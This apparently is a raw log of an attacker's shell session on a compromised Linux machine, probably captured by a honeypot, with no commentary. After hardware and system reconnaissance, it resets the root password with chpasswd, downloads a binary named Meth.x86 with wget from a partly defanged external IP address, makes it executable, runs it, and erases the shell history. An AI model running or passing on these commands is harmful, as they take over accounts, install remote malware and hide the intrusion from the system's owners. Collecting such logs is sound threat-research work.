----
lscpu | grep Model
uname -a
uname
top
cat /proc/cpuinfo | grep model | grep name | wc -l
uname -m
w
crontab -l
----
which ls
ls -lh $(which ls)
----
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
----
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
----
echo \"root:unCufOntC7Ff\"|chpasswd|bash"
----
cat /proc/cpuinfo | grep name | wc -l
----
sudo echo $UID
CMD: cat /etc/issue
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /
wget -q hxxp://45.95.168.228/YaO2uFOvUG8LV1y5NY1aCHmr1WdBLjcjiVD6aRRAWDL6oNY29J88y0nrXxaHBmTLEYC9yB56gBn95pco8kCbldVsHmjNQk8JTaC/Meth.x86
cat Meth.x86 > meth
chmod +x meth
./meth ROOTED
history -c
